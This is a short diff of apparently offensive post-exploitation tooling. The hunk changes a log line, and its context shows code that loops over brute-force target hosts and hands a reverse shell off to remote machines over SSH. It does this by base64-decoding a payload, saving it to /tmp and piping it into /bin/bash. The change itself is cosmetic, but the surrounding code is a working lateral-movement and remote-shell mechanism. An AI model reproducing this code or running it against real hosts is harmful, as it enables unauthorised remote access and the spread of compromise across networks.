@@ -211,7 +211,7 @@ for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk 
     echo "connection complete."
 done'''.encode("utf-8"))
             session.log(
-                f"starting reverse shell hand off on remote host off via ssh: {payload}")
+                f"starting reverse shell hand off on remote host off via ssh: {payload.decode()}")
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_ssh_reverse_shell | base64 -d | /bin/bash'",
                 cwd="/tmp", timeout=7200)
